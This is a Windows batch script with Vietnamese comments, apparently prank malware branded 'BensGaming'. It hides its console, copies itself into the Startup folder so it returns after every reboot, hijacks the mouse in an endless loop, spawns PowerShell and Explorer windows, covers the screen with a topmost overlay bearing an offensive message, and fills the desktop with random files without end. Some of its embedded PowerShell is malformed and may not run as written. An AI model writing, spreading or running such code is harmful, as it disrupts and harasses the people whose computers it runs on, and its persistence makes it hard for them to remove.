@echo off
set /p key=Key là gì: 

:: Ẩn console
powershell -windowstyle hidden -command ""

:: Thêm vào startup
powershell -Command "
$scriptPath = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\mouse_mover.bat';
Copy-Item -Path '%~f0' -Destination $scriptPath -Force"

:: Chạy script di chuyển chuột và thực hiện các hành động khác
start /min powershell -Command "
Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Mouse { [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y); }' -Language CSharp;
while ($true) {
    $x = Get-Random -Minimum 0 -Maximum (Get-WmiObject Win32_DesktopMonitor).ScreenWidth;
    $y = Get-Random -Minimum 0 -Maximum (Get-WmiObject Win32_DesktopMonitor).ScreenHeight;
    [Mouse]::SetCursorPos($x, $y);
    Start-Sleep -Seconds 0.1;
}"

:: Hiện thông báo với giao diện đẹp hơn
powershell -Command "[System.Windows.MessageBox]::Show('BensGaming On Top', 'Thông báo', 0, 64)"

:: Mở nhiều PowerShell và Explorer với độ trễ
start powershell
ping -n 2 127.0.0.1 >nul
start powershell
ping -n 2 127.0.0.1 >nul
start explorer
ping -n 2 127.0.0.1 >nul
start explorer

:: Mở link YouTube
start https://www.youtube.com/watch?v=PFGCEl9MbBw

:: Phát âm thanh cảnh báo
powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\Windows Notify System Generic.wav').PlaySync()"

:: Mở Google Chrome
start chrome

:: Hiện chữ đỏ trên màn hình
start /min powershell -Command "
Add-Type -TypeDefinition 'using System; using System.Drawing; using System.Windows.Forms; public class Overlay : Form { public Overlay() { this.FormBorderStyle = FormBorderStyle.None; this.BackColor = Color.Red; this.TransparencyKey = Color.Red; this.TopMost = true; this.Bounds = Screen.PrimaryScreen.Bounds; Label lbl = new Label(); lbl.Text = \"Your Pc Is Gay\"; lbl.Font = new Font(\"Arial\", 48, FontStyle.Bold); lbl.ForeColor = Color.Red; lbl.AutoSize = true; lbl.Location = new Point((this.Width - lbl.Width) / 2, (this.Height - lbl.Height) / 2); this.Controls.Add(lbl); } } [STAThread] static void Main() { Application.EnableVisualStyles(); Application.Run(new Overlay()); }' -Language CSharp;
[Overlay]::Main()"

:: Spam file ở desktop
start /min powershell -Command "
$desktop = [System.Environment]::GetFolderPath('Desktop');
while ($true) {
    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + '.txt';
    New-Item -Path "$desktop\$randomName" -ItemType File -Force | Out-Null;
    Start-Sleep -Milliseconds 500;
}